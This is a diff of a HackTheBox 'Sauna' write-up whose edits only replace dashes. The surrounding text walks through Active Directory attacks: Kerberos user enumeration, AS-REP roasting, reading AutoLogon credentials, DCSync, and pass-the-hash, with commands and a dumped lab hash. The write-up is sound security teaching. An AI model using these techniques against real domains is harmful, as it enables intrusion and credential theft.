@@ -1,6 +1,6 @@
 ---
 slug: "htb-sauna"
-title: "Sauna — HackTheBox Machine Writeup"
+title: "Sauna - HackTheBox Machine Writeup"
 date: "2026-08-06"
 platform: "HackTheBox"
 type: "Machine"
@@ -56,7 +56,7 @@ import { TerminalReplay } from "@/components/cyber/TerminalReplay";
 
 Sauna is a Windows Domain Controller running an IIS website that leaks the
 names of every employee on a "Meet The Team" page. Those names become Kerberos
-username candidates, and one account (`fsmith`) is **AS-REP roastable** — it
+username candidates, and one account (`fsmith`) is **AS-REP roastable** - it
 does not require Kerberos pre-authentication, so its password can be requested
 and cracked offline. The resulting WinRM session reveals **AutoLogon
 credentials** for a loan-manager service account (`svc_loanmgr`) stored in the
@@ -67,7 +67,7 @@ Pass-the-Hash login as Administrator closes the box.
 
 <Callout type="info">
   **Tooling note:** all Active Directory *collection and analysis* on this
-  machine is done with **pharaohound** — a single tool that queries the DC
+  machine is done with **pharaohound** - a single tool that queries the DC
   over LDAP (its built-in collector), builds the object graph, and runs 30+
   analyzers to rank attack paths. No BloodHound/SharpHound needed.
 </Callout>
@@ -118,7 +118,7 @@ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -T4 -Pn
 5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 ```
 
-**Domain:** `EGOTISTICAL-BANK.LOCAL` — hostname `SAUNA`. WinRM being open
+**Domain:** `EGOTISTICAL-BANK.LOCAL` - hostname `SAUNA`. WinRM being open
 means `evil-winrm` is a viable shell once we have credentials.
 
 ### Website Enumeration (Port 80)
@@ -141,7 +141,7 @@ The "Meet The Team" page lists six employees:
 <Callout type="info">
   **Key insight:** AD usernames follow predictable conventions. A
   `[first initial][lastname]` format gives a short candidate list to throw at
-  Kerberos — the KDC answers *differently* for existing and non-existing
+  Kerberos - the KDC answers *differently* for existing and non-existing
   accounts, which is exactly how username enumeration works.
 </Callout>
 
@@ -172,7 +172,7 @@ kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.56.80 users.txt
 
 Four valid accounts: `administrator`, `sauna`, `fsmith`, `hsmith`.
 
-## Initial Access — AS-REP Roasting
+## Initial Access - AS-REP Roasting
 
 ### Why AS-REP roasting works
 
@@ -180,7 +180,7 @@ In Kerberos, the *first* ticket request (AS-REQ) is normally sent encrypted
 with the user's password-derived key to prove the client knows the password
 (**pre-authentication**). When an account has `UF_DONT_REQUIRE_PREAUTH` set,
 the KDC happily returns an encrypted TGT for *anyone* who asks. That TGT is
-encrypted with the user's password hash — so we can brute-force the password
+encrypted with the user's password hash - so we can brute-force the password
 offline from the ticket alone.
 
 `impacket-GetNPUsers` asks the KDC for a TGT for each candidate:
@@ -199,7 +199,7 @@ impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashc
 
 ![AS-REP roast](https://i.imgur.com/eimTJ3p.png)
 
-`fsmith` is roastable — a `$krb5asrep$23$` hash is written to disk
+`fsmith` is roastable - a `$krb5asrep$23$` hash is written to disk
 (truncated here, full value in `loot/hashes.asreproast`):
 
 ```text
@@ -276,7 +276,7 @@ pharaohound pha-collect/ -o pharaohound-report/ --format both --all --no-color \
   [HIGH    ] KERBEROASTABLE USERS
   [HIGH    ] AS-REP ROASTABLE USERS
   [HIGH    ] MACHINE ACCOUNT QUOTA ABUSE
-  Risk Level: HIGH — Multiple critical paths to Domain Admin
+  Risk Level: HIGH - Multiple critical paths to Domain Admin
 
 ◆ Path 1: AS-REP Roast: FSmith@EGOTISTICAL-BANK.LOCAL  🟢
 ◆ Path 2: MAQ → RBCD: EGOTISTICAL-BANK.LOCAL (quota=10)  🟠
@@ -288,12 +288,12 @@ pharaohound pha-collect/ -o pharaohound-report/ --format both --all --no-color \
 <Callout type="warning">
   **Attack-path map:** Path 1 (the one we already used) confirms the
   AS-REP roast. Path 3 flags that the DC computer account itself has
-  **unconstrained delegation** — a classic setup for forcing authentication
+  **unconstrained delegation** - a classic setup for forcing authentication
   and grabbing a `DC$` TGT, which can then be used for DCSync. Either way the
   destination is the same: Domain Admin.
 </Callout>
 
-## Privilege Escalation — fsmith → svc_loanmgr
+## Privilege Escalation - fsmith → svc_loanmgr
 
 ### AutoLogon credentials in the registry
 
@@ -323,14 +323,14 @@ WINRM  10.129.56.80  5985  SAUNA  [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneyma
 ```
 
 <Callout type="info">
-  **Why this matters:** `svc_loanmgr` is a service account — and on this
+  **Why this matters:** `svc_loanmgr` is a service account - and on this
   domain it has been granted far more than it needs.
 </Callout>
 
-## Domain Compromise — DCSync with svc_loanmgr
+## Domain Compromise - DCSync with svc_loanmgr
 
 Re-collecting with the more privileged account and re-analyzing shows the
-same picture — multiple roads to Domain Admin. The decisive right is
+same picture - multiple roads to Domain Admin. The decisive right is
 **DCSync**: the `Replicating Directory Changes` (and `All`) permissions let
 an account impersonate a Domain Controller and ask for any account's password
 hash over the replication protocol. It is intended for backup agents; here it
@@ -358,9 +358,9 @@ Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb7
 
 **Administrator NTLM hash: `823452073d75b9d1cf70ebdf86c7f98e`**
 
-## Root — Pass-the-Hash as Administrator
+## Root - Pass-the-Hash as Administrator
 
-With the NTLM hash we never need the Administrator password — WinRM accepts
+With the NTLM hash we never need the Administrator password - WinRM accepts
 the hash directly:
 
 ```bash
@@ -384,5 +384,5 @@ evil-winrm -i 10.129.56.80 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
 - [AS-REP Roasting (HackTricks)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
 - [DCSync attacks explained](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
 - [Pass-the-Hash basics](https://www.thehacker.recipes/ad/movement/ntlm/pth)
-- [pharaohound — AD collection & analysis framework](https://github.com/Asbawy/pharaohound)
+- [pharaohound - AD collection & analysis framework](https://github.com/Asbawy/pharaohound)
 - [evil-winrm](https://github.com/Hackplayers/evil-winrm)
